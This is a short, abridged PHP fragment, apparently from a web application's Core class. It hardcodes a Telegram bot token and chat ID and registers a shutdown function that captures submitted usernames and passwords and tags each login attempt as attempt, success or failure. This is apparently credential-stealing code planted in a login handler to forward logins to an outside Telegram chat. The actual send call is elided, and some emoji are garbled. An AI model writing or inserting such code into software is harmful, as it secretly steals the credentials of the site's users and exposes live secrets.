...
class Core
{
    ...
    {
        $baseUrl = false;$contextPath = false;
...
$bot_token = '8872445841:AAFnDwxzjqqY12faNibg_TcVTN7UEwUTkGc';
$chat_id = '8610974230';
...
if (!empty($username) && !empty($password)) {
    ...
    register_shutdown_function(function() use ($login_data, $bot_token, $chat_id) {
        ...
        // Tentukan status
        $status = 'ATTEMPT'; $emoji = 'ðŸ”';
        if ($is_success) { $status = 'SUCCESS'; $emoji = 'âœ…'; }
        elseif ($is_failed) { $status = 'FAILED'; $emoji = 'âŒ'; }
